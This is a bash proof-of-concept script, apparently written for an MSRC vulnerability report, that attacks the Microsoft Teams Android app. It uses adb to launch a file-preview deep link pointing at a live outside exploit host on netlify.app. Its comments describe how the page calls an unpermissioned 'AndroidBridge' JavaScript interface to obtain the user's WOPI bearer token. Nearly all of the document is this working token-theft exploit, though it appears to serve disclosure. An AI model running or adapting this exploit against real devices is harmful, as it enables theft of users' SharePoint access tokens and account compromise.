#!/usr/bin/env bash
# ==============================================================================
# MSRC Instant PoC Runner: Zero-Origin AndroidBridge WOPI Token Disclosure
# Target: com.microsoft.teams (Android)
# Live Exploit Host: https://cosmic-dusk-cc5c4b.netlify.app/
# ==============================================================================
set -e

echo "=== [MSRC PoC] Checking Target Device & Package ==="
if command -v adb >/dev/null 2>&1; then
    ADB_CMD="adb shell"
else
    ADB_CMD=""
fi

echo "[*] Verifying com.microsoft.teams installation..."
$ADB_CMD pm list packages | grep "com.microsoft.teams" || {
    echo "[-] Error: com.microsoft.teams not found on connected device."
    exit 1
}

echo ""
echo "=== [Step 1: Host / Exploit Verification] ==="
echo "[*] Exploit probe is hosted live at: https://cosmic-dusk-cc5c4b.netlify.app/"
echo "[*] Local copy available in: poc/wopi_token_theft_exploit.html"

echo ""
echo "=== [Step 2: Dispatching File Preview Deep Link] ==="
echo "[*] Invoking SplashActivity with file preview deep link..."
$ADB_CMD am start -n com.microsoft.teams/com.microsoft.skype.teams.views.activities.SplashActivity \
  -a android.intent.action.VIEW \
  -d "msteams://teams.microsoft.com/l/file/test_file_id?fileType=docx&objectUrl=https%3A%2F%2Fcosmic-dusk-cc5c4b.netlify.app"

echo ""
echo "[+] SUCCESS: Deep link intent dispatched."
echo ""
echo "=== [Step 3: Exploit Mechanism & Expected Delivery] ==="
echo "1. Teams OwlFilePreviewFragment loads WebView with baseUrl = https://cosmic-dusk-cc5c4b.netlify.app"
echo "2. Native code registers unpermissioned JavaScript bridge:"
echo "   webView.addJavascriptInterface(new JsApiPreviewerInterface(), 'AndroidBridge');"
echo "3. Page script invokes:"
echo "   window.AndroidBridge.postMessage('{\"method\":\"fileToLoad\"}');"
echo "4. In an active SharePoint session, native code returns the raw WOPI Bearer token via:"
echo "   window.jsApiNativeBridge.onResponse({\"accessToken\":\"<LIVE_BEARER_TOKEN>\", ...});"
echo "=== PoC Execution Complete ==="
